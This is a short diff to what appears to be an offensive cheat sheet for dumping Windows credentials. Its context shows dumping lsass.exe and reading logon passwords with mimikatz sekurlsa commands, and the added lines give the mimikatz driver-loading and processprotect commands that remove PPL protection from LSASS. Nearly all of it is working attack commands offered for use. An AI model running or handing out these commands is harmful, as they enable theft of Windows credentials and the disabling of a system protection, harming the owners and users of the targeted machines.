@@ -12,6 +12,10 @@ Click on lsass.exe and select “Create Dump File”
 mimikatz # sekurlsa::minidump C:\Users\sandbox\Desktop\lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 
+[Remomove PPL protection if exist loading driver] [Require SeLoadDriverPrivilege]
+mimikatz# !+
+mimikatz# !processprotect /process:lsass.exe /remove
+
 
 [Registry Hives]
 
